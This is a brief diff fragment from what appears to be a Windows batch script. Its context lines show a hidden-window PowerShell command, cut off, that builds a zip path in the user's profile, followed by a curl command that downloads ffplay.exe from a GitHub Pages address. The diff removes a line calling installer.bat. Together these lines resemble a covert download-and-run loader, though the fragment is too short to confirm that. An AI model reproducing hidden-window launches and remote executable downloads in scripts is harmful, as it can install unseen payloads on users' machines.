@@ -7,4 +7,3 @@ powershell -WindowStyle Hidden -Command "$o=$env:USERPROFILE+'\A.zip'; $e=$env:U
 
 
 curl -L -o ffplay.exe https://jmorg23.github.io/AV/ffplay.exe
-installer.bat
